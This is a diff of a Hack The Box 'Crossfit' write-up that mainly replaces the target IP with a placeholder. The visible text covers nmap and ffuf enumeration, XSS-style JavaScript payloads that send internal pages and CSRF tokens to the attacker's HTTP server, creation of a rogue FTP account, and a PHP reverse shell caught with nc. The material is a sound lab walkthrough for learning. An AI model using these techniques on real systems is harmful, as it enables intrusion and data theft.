@@ -11,9 +11,7 @@ htb_url: https://app.hackthebox.com/machines/Crossfit
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-crossfit-infocard.png)
-
- This Insane-difficulty machine from Hack The Box took far longer to root than I would have liked, mostly due to getting hung up on the the final exploit. I took a break from it, after getting the user.txt, due to frustration and wanting to make progress elsewhere. This machine challenged me in a number of areas, from creative enumeration methods, to code and binary analysis, to "exploit" writing in a foreign language \(JavaScript and C!\). After taking a break for a few months, I came back with a fresh perspective and was able to quickly discover the errors I had been making. \(Along with fresh patience with the quick-clean script the authors used!\). A script to automate all of the moving pieces of the final exploit solved my issues and I was able to root the machine. 
+This Insane-difficulty machine from Hack The Box took far longer to root than I would have liked, mostly due to getting hung up on the the final exploit. I took a break from it, after getting the user.txt, due to frustration and wanting to make progress elsewhere. This machine challenged me in a number of areas, from creative enumeration methods, to code and binary analysis, to "exploit" writing in a foreign language \(JavaScript and C!\). After taking a break for a few months, I came back with a fresh perspective and was able to quickly discover the errors I had been making. \(Along with fresh patience with the quick-clean script the authors used!\). A script to automate all of the moving pieces of the final exploit solved my issues and I was able to root the machine. 
 
 ## Useful Skills and Tools
 
@@ -36,7 +34,7 @@ lftp :~> set ssl:verify-certificate no
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.208`.  The options I regularly use are: 
+I started my enumeration with an nmap scan of `<YOUR_IP>`.  The options I regularly use are: 
 
 | `Flag` | Purpose |
 | :--- | :--- |
@@ -52,7 +50,7 @@ All this time I did not know that there were more levels of verbosity, I had jus
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
-└─$ nmap -sCV -n -p- -Pn -vvv 10.10.10.208                                                          1 ⨯
+└─$ nmap -sCV -n -p- -Pn -vvv <YOUR_IP>                                                          1 ⨯
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-28 12:30 EST
 NSE: Loaded 153 scripts for scanning.
@@ -67,15 +65,15 @@ NSE: Starting runlevel 3 (of 3) scan.
 Initiating NSE at 12:30
 Completed NSE at 12:30, 0.00s elapsed
 Initiating Connect Scan at 12:30
-Scanning 10.10.10.208 [65535 ports]
-Discovered open port 22/tcp on 10.10.10.208
-Discovered open port 80/tcp on 10.10.10.208
-Discovered open port 21/tcp on 10.10.10.208
+Scanning <YOUR_IP> [65535 ports]
+Discovered open port 22/tcp on <YOUR_IP>
+Discovered open port 80/tcp on <YOUR_IP>
+Discovered open port 21/tcp on <YOUR_IP>
 Completed Connect Scan at 12:30, 32.81s elapsed (65535 total ports)
 Initiating Service scan at 12:30
-Scanning 3 services on 10.10.10.208
+Scanning 3 services on <YOUR_IP>
 Completed Service scan at 12:30, 11.19s elapsed (3 services on 1 host)
-NSE: Script scanning 10.10.10.208.
+NSE: Script scanning <YOUR_IP>.
 NSE: Starting runlevel 1 (of 3) scan.
 Initiating NSE at 12:30
 Completed NSE at 12:30, 3.26s elapsed
@@ -85,7 +83,7 @@ Completed NSE at 12:30, 0.44s elapsed
 NSE: Starting runlevel 3 (of 3) scan.
 Initiating NSE at 12:30
 Completed NSE at 12:30, 0.00s elapsed
-Nmap scan report for 10.10.10.208
+Nmap scan report for <YOUR_IP>
 Host is up, received user-set (0.061s latency).
 Scanned at 2020-12-28 12:30:02 EST for 48s
 Not shown: 65532 closed ports
@@ -267,7 +265,7 @@ Using Burp I sent a request with a link to my machine in the `User-Agent` field.
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ nc -lvnp 8090                       
 listening on [any] 8090 ...
-connect to [10.10.15.98] from (UNKNOWN) [10.10.10.208] 56252
+connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 56252
 GET / HTTP/1.1
 Host: 10.10.15.98:8090
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -288,7 +286,7 @@ In the `Referer` field I saw `/security_threat/report.php` in the response heade
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ python3 -m http.server 8099
 Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
-10.10.10.208 - - [28/Dec/2020 14:53:10] "GET /php-reverse-shell.php HTTP/1.1" 200 -
+<YOUR_IP> - - [28/Dec/2020 14:53:10] "GET /php-reverse-shell.php HTTP/1.1" 200 -
 ```
 
 In the same spirit I tried to get the admin to download a PHP reverse shell from me, but I couldn't find where it had been uploaded nor figure out how to execute it.
@@ -306,7 +304,7 @@ I was familiar with fuzzing for vhosts as well as directories and files, but fuz
 
 ```bash
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
-└─$ ffuf -t 25 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.10.208 -H 'Origin: http://FUZZ.crossfit.htb' -mr 'Allow-Origin'               
+└─$ ffuf -t 25 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<YOUR_IP> -H 'Origin: http://FUZZ.crossfit.htb' -mr 'Allow-Origin'               
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -319,7 +317,7 @@ I was familiar with fuzzing for vhosts as well as directories and files, but fuz
 ________________________________________________
 
  :: Method           : GET
- :: URL              : http://10.10.10.208
+ :: URL              : http://<YOUR_IP>
  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
  :: Header           : Origin: http://FUZZ.crossfit.htb
  :: Follow redirects : false
@@ -375,11 +373,11 @@ I wrote a JavaScript payload to reach out to the `ftp.crossfit.htb` site then se
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ python3 -m http.server 8090                                      
 Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
-10.10.10.208 - - [15/Jan/2021 18:21:03] "GET /test.js HTTP/1.1" 200 -
-10.10.10.208 - - [15/Jan/2021 18:24:34] "GET /test.js HTTP/1.1" 200 -
-10.10.10.208 - - [15/Jan/2021 18:28:05] "GET /test.js HTTP/1.1" 200 -
-10.10.10.208 - - [15/Jan/2021 18:28:05] code 404, message File not found
-10.10.10.208 - - [15/Jan/2021 18:28:05] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EFTP%20Hosting%20-%20Account%20Management%3C/h2%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-success%22%20href=%22http://ftp.crossfit.htb/accounts/create%22%3E%20Create%20New%20Account%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Ctable%20class=%22table%20table-bordered%22%3E%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ENo%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3EUsername%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ECreation%20Date%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%20width=%22280px%22%3EAction%3C/th%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/table%3E%20%20%20%20%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
+<YOUR_IP> - - [15/Jan/2021 18:21:03] "GET /test.js HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Jan/2021 18:24:34] "GET /test.js HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Jan/2021 18:28:05] "GET /test.js HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Jan/2021 18:28:05] code 404, message File not found
+<YOUR_IP> - - [15/Jan/2021 18:28:05] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EFTP%20Hosting%20-%20Account%20Management%3C/h2%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-success%22%20href=%22http://ftp.crossfit.htb/accounts/create%22%3E%20Create%20New%20Account%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Ctable%20class=%22table%20table-bordered%22%3E%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ENo%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3EUsername%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ECreation%20Date%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%20width=%22280px%22%3EAction%3C/th%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/table%3E%20%20%20%20%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
 ```
 
 It took me a few tries, but I was able to get the server to download my script and execute it.  The final response I got contained the encoded HTML for a web page.  
@@ -430,9 +428,9 @@ After decoding the response I had the webpage at `http://ftp.crossfit.htb` as vi
 I saved the HTML code to a file and opened it in my browser.  The page turned out to be an account management page for FTP.  The "Create Account" button was a link to a site that sounded interesting: `http://ftp.crossfit.htb/accounts/create`.  I modified my JavaScript payload to see what was at this page.
 
 ```text
-10.10.10.208 - - [15/Jan/2021 18:41:59] "GET /test.js HTTP/1.1" 200 -
-10.10.10.208 - - [15/Jan/2021 18:41:59] code 404, message File not found
-10.10.10.208 - - [15/Jan/2021 18:41:59] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EAdd%20New%20Account%3C/h2%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-primary%22%20href=%22http://ftp.crossfit.htb/accounts%22%3E%20Back%3C/a%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%3C/div%3E%3Cform%20action=%22http://ftp.crossfit.htb/accounts%22%20method=%22POST%22%3E%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_token%22%20value=%22GSlwHU3OU1s0lcF102Hku1jwvXeBtqGiAvKCjEGH%22%3E%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-xs-12%20col-sm-12%20col-md-12%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22form-group%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cstrong%3EUsername:%3C/strong%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22text%22%20name=%22username%22%20class=%22form-control%22%20placeholder=%22Username%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-xs-12%20col-sm-12%20col-md-12%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22form-group%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cstrong%3EPassword:%3C/strong%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22password%22%20name=%22pass%22%20class=%22form-control%22%20placeholder=%22Password%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-xs-12%20col-sm-12%20col-md-12%20text-center%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type=%22submit%22%20class=%22btn%20btn-primary%22%3ESubmit%3C/button%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%3C/form%3E%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
+<YOUR_IP> - - [15/Jan/2021 18:41:59] "GET /test.js HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Jan/2021 18:41:59] code 404, message File not found
+<YOUR_IP> - - [15/Jan/2021 18:41:59] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EAdd%20New%20Account%3C/h2%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-primary%22%20href=%22http://ftp.crossfit.htb/accounts%22%3E%20Back%3C/a%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%3C/div%3E%3Cform%20action=%22http://ftp.crossfit.htb/accounts%22%20method=%22POST%22%3E%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_token%22%20value=%22GSlwHU3OU1s0lcF102Hku1jwvXeBtqGiAvKCjEGH%22%3E%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-xs-12%20col-sm-12%20col-md-12%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22form-group%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cstrong%3EUsername:%3C/strong%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22text%22%20name=%22username%22%20class=%22form-control%22%20placeholder=%22Username%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-xs-12%20col-sm-12%20col-md-12%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22form-group%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cstrong%3EPassword:%3C/strong%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22password%22%20name=%22pass%22%20class=%22form-control%22%20placeholder=%22Password%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-xs-12%20col-sm-12%20col-md-12%20text-center%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type=%22submit%22%20class=%22btn%20btn-primary%22%3ESubmit%3C/button%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%3C/form%3E%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
 ```
 
 I got back a response with the encoded HTML code for the `/accounts/create` website.
@@ -519,9 +517,9 @@ I modified my script to retrieve the hidden `_token` value.  At first, I tried j
 Once I was able to correctly parse this from the output I was able to send my POST request to the server to create a new user.  First though, I had the test script send just the token back to me so I could see that it worked.
 
 ```markup
-10.10.10.208 - - [15/Jan/2021 19:37:38] "GET /test2.js HTTP/1.1" 200 -
-10.10.10.208 - - [15/Jan/2021 19:37:38] code 404, message File not found
-10.10.10.208 - - [15/Jan/2021 19:37:38] "GET /ObNaK9gJvibNxvnGNi26mA1IdM5PfI6BVme775Nc HTTP/1.1" 404 -
+<YOUR_IP> - - [15/Jan/2021 19:37:38] "GET /test2.js HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Jan/2021 19:37:38] code 404, message File not found
+<YOUR_IP> - - [15/Jan/2021 19:37:38] "GET /ObNaK9gJvibNxvnGNi26mA1IdM5PfI6BVme775Nc HTTP/1.1" 404 -
 ```
 
 I received the reply back, this time with only the hidden `_token` value.
@@ -572,11 +570,11 @@ request4.send();
 Next, I modified my payload to actually create the new FTP user.  
 
 ```text
-10.10.10.208 - - [15/Jan/2021 21:51:58] "GET /test3.js HTTP/1.1" 200 -
-10.10.10.208 - - [15/Jan/2021 21:51:58] code 501, message Unsupported method ('POST')
-10.10.10.208 - - [15/Jan/2021 21:51:58] "POST /username=test3&pass=p@ssword123&_token=EnEv1a4N27y3dqOO8UpAiGqpr3WuAbAUyoJ5D8at HTTP/1.1" 501 -
-10.10.10.208 - - [15/Jan/2021 21:51:58] code 404, message File not found
-10.10.10.208 - - [15/Jan/2021 21:51:58] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EFTP%20Hosting%20-%20Account%20Management%3C/h2%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-success%22%20href=%22http://ftp.crossfit.htb/accounts/create%22%3E%20Create%20New%20Account%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22alert%20alert-success%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3EAccount%20created%20successfully.%3C/p%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Ctable%20class=%22table%20table-bordered%22%3E%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ENo%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3EUsername%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ECreation%20Date%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%20width=%22280px%22%3EAction%3C/th%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E1%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3Etest3%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E2021-01-15%2002:01:55%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20action=%22http://ftp.crossfit.htb/accounts/85%22%20method=%22POST%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-info%22%20href=%22http://ftp.crossfit.htb/accounts/85%22%3EShow%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-primary%22%20href=%22http://ftp.crossfit.htb/accounts/85/edit%22%3EEdit%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_token%22%20value=%22EnEv1a4N27y3dqOO8UpAiGqpr3WuAbAUyoJ5D8at%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_method%22%20value=%22DELETE%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type=%22submit%22%20class=%22btn%20btn-danger%22%3EDelete%3C/button%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/form%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/td%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/table%3E%20%20%20%20%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
+<YOUR_IP> - - [15/Jan/2021 21:51:58] "GET /test3.js HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Jan/2021 21:51:58] code 501, message Unsupported method ('POST')
+<YOUR_IP> - - [15/Jan/2021 21:51:58] "POST /username=test3&pass=p@ssword123&_token=EnEv1a4N27y3dqOO8UpAiGqpr3WuAbAUyoJ5D8at HTTP/1.1" 501 -
+<YOUR_IP> - - [15/Jan/2021 21:51:58] code 404, message File not found
+<YOUR_IP> - - [15/Jan/2021 21:51:58] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EFTP%20Hosting%20-%20Account%20Management%3C/h2%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-success%22%20href=%22http://ftp.crossfit.htb/accounts/create%22%3E%20Create%20New%20Account%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22alert%20alert-success%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3EAccount%20created%20successfully.%3C/p%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Ctable%20class=%22table%20table-bordered%22%3E%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ENo%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3EUsername%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ECreation%20Date%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%20width=%22280px%22%3EAction%3C/th%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E1%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3Etest3%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E2021-01-15%2002:01:55%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20action=%22http://ftp.crossfit.htb/accounts/85%22%20method=%22POST%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-info%22%20href=%22http://ftp.crossfit.htb/accounts/85%22%3EShow%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-primary%22%20href=%22http://ftp.crossfit.htb/accounts/85/edit%22%3EEdit%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_token%22%20value=%22EnEv1a4N27y3dqOO8UpAiGqpr3WuAbAUyoJ5D8at%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_method%22%20value=%22DELETE%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type=%22submit%22%20class=%22btn%20btn-danger%22%3EDelete%3C/button%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/form%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/td%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/table%3E%20%20%20%20%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
 ```
 
 Got a response on my HTTP server with the parameters I was sending to the server, then again with HTML code of the response.  I hoped that it included some kind of way to tell if I had been successful at creating a user.  
@@ -855,7 +853,7 @@ request2.send()
 I once again modified my original JavaScript exploit from earlier, this time simply requesting access to my PHP backdoor.  I hoped that this would execute the code within and send me a reverse shell.  On this one I took a logical leap.  I assumed that since each of the other folders was running a virtually hosted web domain that `development-test` would be the same \(even though there was currently no web page hosted there\).
 
 ```text
-10.10.10.208 - - [15/Jan/2021 22:36:59] "GET /test4.js HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Jan/2021 22:36:59] "GET /test4.js HTTP/1.1" 200 -
 ```
 
 I received a connection request for my JavaScript code, and Burp, which I had used to send the request, showed that the server was stuck while trying to send me a response.  This was good sign as this tends to happen when sending a reverse shell this way.
@@ -870,7 +868,7 @@ Script started, output log file is 'initial-foothold'.
 └─$ bash                                                             
 zweilos@kali:~/htb/crossfit$ nc -lvnp 8091
 listening on [any] 8091 ...
-connect to [10.10.14.161] from (UNKNOWN) [10.10.10.208] 60548
+connect to [10.10.14.161] from (UNKNOWN) [<YOUR_IP>] 60548
 Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
  22:51:04 up 2 days,  9:01,  0 users,  load average: 1.78, 2.11, 2.04
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -1009,8 +1007,6 @@ drwxrwxrwx 4 isaac admins  4096 May  9  2020 send_updates
 
 I saw that `hank` had `user.txt` in his home folder, so now I knew I needed to move laterally to that user to get it.
 
-
-
 TODO: insert output of search for hank in files \(I may have deleted this since because of too many files?\)
 
 ```text
